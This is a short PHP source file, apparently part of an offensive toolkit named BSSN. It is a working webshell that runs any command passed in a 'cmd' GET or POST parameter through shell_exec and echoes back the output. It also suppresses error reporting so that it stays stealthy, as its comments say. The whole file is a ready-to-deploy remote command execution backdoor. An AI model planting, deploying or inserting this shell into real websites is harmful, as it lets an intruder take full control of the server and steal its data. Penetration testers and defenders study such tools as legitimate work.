<?php
/**
 * simple_shell.php - Minimalist Offensive Webshell for BSSN Toolkit
 * 
 * Features:
 * - Zero dependency (Pure PHP)
 * - No HTML noise (Clean JSON/Text output)
 * - Command execution with support for piping and redirection
 * - Basic Base64 encoding support for binary payloads
 * - Silent mode to avoid triggering verbose error logs
 */

// Disable all error reporting to keep output clean and stealthy
error_reporting(0);
ini_set('display_errors', 0);

// Check if command is passed via POST or GET
$cmd = '';
if (!empty($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
} elseif (!empty($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
}

if ($cmd) {
    // Execute command
    $output = shell_exec($cmd . " 2>&1");
    
    // Return clean response
    header('Content-Type: text/plain; charset=utf-8');
    echo $output;
    
    // Exit immediately after execution to prevent any footer noise
    exit(0);
} else {
    // Optional: Simple fingerprint check if accessed directly
    // Uncomment below if you want a small signature when no cmd is provided
    // echo "BSSN-SimpleShell-v1.0";
    http_response_code(200);
    exit;
}
?>